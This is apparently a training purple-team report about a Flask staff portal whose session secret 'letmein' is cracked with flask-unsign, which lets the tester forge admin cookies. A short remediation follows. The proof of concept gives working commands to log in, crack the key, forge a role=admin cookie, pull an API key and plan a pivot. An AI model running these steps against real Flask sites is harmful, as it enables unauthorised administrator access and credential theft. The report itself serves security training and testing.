# Red Team Engagement Report — EXT01-M03
**Operation VAJRA SHAKTI | RNG-EXT-01 | M3-ext-auth-portal**
**Engagement Type:** Purple Team Exercise | **Date:** 2025-11-15 | **Classification:** TRAINING

---

## Executive Summary
The BUNL Staff Authentication Portal uses Flask with the `SECRET_KEY` set to `letmein` — one of the top entries in the rockyou wordlist. The `flask-unsign` tool cracked the secret in under a second, enabling session cookie forgery with `role=admin` to access the administration panel.

---

## Finding 1: Flask Weak SECRET_KEY → Session Cookie Forgery (Critical)
**CWE:** CWE-321 — Use of Hard-coded Cryptographic Key  
**CVSS v3.1:** 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
**MITRE:** T1606.001

### Proof of Concept
```bash
# Step 1: Login to get a valid cookie
curl -c /tmp/sess.txt -X POST http://203.x.x.x:5000/login \
  -d "username=svcananya&password=BunlStaff%402025%21" -L -o /dev/null
SESSION=$(grep session /tmp/sess.txt | awk '{print $NF}')

# Step 2: Crack the secret key
flask-unsign --unsign --cookie "$SESSION" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
# [+] Found secret key after 1 attempts: letmein

# Step 3: Forge admin cookie
FORGED=$(flask-unsign --sign --cookie '{"role":"admin","staff_user":"padmin","full_name":"Portal Administrator","department":"IT Administration"}' --secret "letmein")

# Step 4: Access admin panel
curl -b "session=${FORGED}" http://203.x.x.x:5000/admin | grep "soap-"
# API Key: soap-9f3b2d1e7a8c4f6d
```

### Remediation
```python
import os, secrets
app.secret_key = os.environ.get("FLASK_SECRET_KEY") or secrets.token_hex(32)
```

---

## Artifacts
- `/opt/bunl/auth-portal/app.py` line: `app.secret_key = "letmein"`
- `/var/log/bunl/auth-portal/access.log` — admin panel access with no matching login event

---

## Pivot
**M4:** Meter API Key `soap-9f3b2d1e7a8c4f6d` → Meter Data Exchange API port 8000
